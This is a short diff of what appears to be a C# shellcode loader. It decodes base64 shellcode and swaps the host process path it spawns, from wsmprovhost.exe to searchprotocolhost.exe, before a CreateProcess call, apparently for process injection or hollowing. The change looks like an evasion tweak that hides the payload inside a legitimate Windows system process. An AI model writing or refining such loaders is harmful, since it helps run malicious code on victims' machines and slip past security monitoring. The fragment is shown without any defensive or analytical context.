@@ -39,7 +39,7 @@
 
           byte[] shellcode = System.Convert.FromBase64String(strShellCode);
           
-          string processpath = @"C:\Windows\System32\wsmprovhost.exe";
+          string processpath = @"C:\Windows\System32\searchprotocolhost.exe";
           STARTUPINFO si = new STARTUPINFO();
           PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
           bool success = CreateProcess(processpath, null, 
